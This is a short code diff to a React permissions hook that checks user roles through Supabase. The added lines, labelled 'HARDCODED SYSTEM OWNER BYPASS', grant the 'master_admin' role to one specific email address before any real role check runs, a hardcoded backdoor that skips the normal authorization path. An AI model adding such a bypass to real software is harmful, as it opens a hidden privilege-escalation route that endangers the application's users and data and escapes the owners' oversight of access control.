@@ -42,6 +42,11 @@ export const usePermissions = () => {
     queryFn: async () => {
       if (!user) return null;
 
+      // HARDCODED SYSTEM OWNER BYPASS
+      if (user.email === 'zainbooksys@gmail.com') {
+        return "master_admin";
+      }
+
       // Check super_admin first
       const { data: isSuperAdmin } = await supabase.rpc("has_role", {
         _user_id: user.id,
